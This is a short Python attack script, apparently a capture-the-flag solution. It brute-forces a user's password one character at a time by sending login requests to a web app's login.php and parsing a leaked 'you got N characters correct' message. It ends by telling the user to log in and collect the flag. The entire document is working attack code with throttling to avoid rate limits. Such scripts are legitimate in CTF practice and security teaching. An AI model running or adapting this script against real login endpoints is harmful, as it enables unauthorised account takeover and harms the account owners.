#!/usr/bin/env python3
# bruteprefix.py
# Usage: python3 bruteprefix.py http://localhost:8080 admin

import sys
import requests
from bs4 import BeautifulSoup
import time

if len(sys.argv) < 3:
    print("Usage: python3 bruteprefix.py <base_url> <username>")
    sys.exit(1)

base = sys.argv[1].rstrip('/')
username = sys.argv[2]

# small charset to start with; extend if needed
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_+=[]{};:,.<>/?"
# You can restrict to known allowed characters to speed up.

session = requests.Session()

def login_attempt(user, password):
    url = base + "/login.php"
    data = {'username': user, 'password': password}
    r = session.post(url, data=data, allow_redirects=True, timeout=10)
    # parse flash message from HTML
    soup = BeautifulSoup(r.text, "html.parser")
    # The app stores flash in session and shows on index.php; but login.php redirects to index.php.
    # Find any text like "you got X characters correct" or "Invalid username or password."
    text = soup.get_text(separator="\n")
    return text

def parse_correct_count(text):
    # look for phrase: "you got {N} characters correct"
    import re
    m = re.search(r'you got\s+(\d+)\s+characters correct', text, re.IGNORECASE)
    if m:
        return int(m.group(1))
    return None

prefix = ""
print("[*] Starting prefix brute force for user:", username)
max_len = 16

while True:
    found = False
    for c in charset:
        attempt = prefix + c
        print(f"[.] Trying: {attempt!r}", end="\r")
        text = login_attempt(username, attempt)
        cnt = parse_correct_count(text)
        if cnt is None:
            # maybe message differs; print snippet for debugging
            # print a short snippet
            snippet = text.strip().splitlines()[:6]
            # print("debug:", snippet)
            pass
        else:
            # if count increased, character is correct
            if cnt > len(prefix):
                prefix = attempt
                print(f"\n[+] Found next char: {c!r} -> prefix now: {prefix!r} (correct count {cnt})")
                found = True
                break
        # slight delay to be polite / avoid rate limits
        time.sleep(0.05)
    if not found:
        print("\n[-] No next character found in charset. Stopping.")
        break
    if len(prefix) >= max_len:
        print("\n[!] Reached max length", max_len)
        break

print("\n[*] Completed. Reconstructed prefix/password:", prefix)
print("[*] Try to login with this password and check dashboard for flag.")
